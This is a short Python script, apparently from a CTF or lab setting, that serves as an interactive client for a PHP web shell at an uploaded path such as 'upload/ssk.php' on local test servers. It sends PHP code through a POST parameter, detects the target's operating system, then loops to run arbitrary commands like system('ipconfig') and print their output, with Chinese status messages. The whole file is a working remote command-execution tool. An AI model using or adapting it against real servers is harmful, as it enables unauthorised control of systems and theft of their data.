import re
import sys
import requests
import chardet
url=['127.0.0.1:81','127.0.0.1:8880']
shell=['/Test/CTF/upload/ssk.php','upload/ssk.php']
getos='echo php_uname("s")'
class invalidshell(Exception):
    pass
for u in url:
    for s in shell:
        try:
            r = requests.post('http://'+u+'/'+s,data={'sk':getos+';'},timeout=5)
            if len(re.sub('\s','',r.text)) != 0 :
                coding = r.apparent_encoding
                r.encoding=coding
                os = re.findall('windows|linux',r.text,re.I)
                print(os[0])
            if len(re.sub('\s','',r.text)) == 0 :
                print('目标无响应')
            else:
                print('##### shell连接成功 #####')
                while 1:
                    c = input()
                    if len(c.replace(' ','')) == 0:
                        continue
                    if c=='exit':
                        exit(0)
                    else:
                        if c=='ip':
                            if 'windows' in os[0].lower():
                                c = "system('ipconfig')"
                            else:
                                c = "system('ifconfig')"
                        if c=='os':
                            c = getos
                        r = requests.post('http://'+u+'/'+s,data={'sk':c+';'},timeout=5)
                        if r.status_code < 400:
                            try:
                                if len(re.sub('\s','',r.text)) != 0 :
                                    coding = r.apparent_encoding
                                    r.encoding=coding
                                    print(r.text)
                                else:
                                    raise invalidshell('invalid')
                            except Exception as x:
                                print('目标无响应')
        except:
            print('连接超时')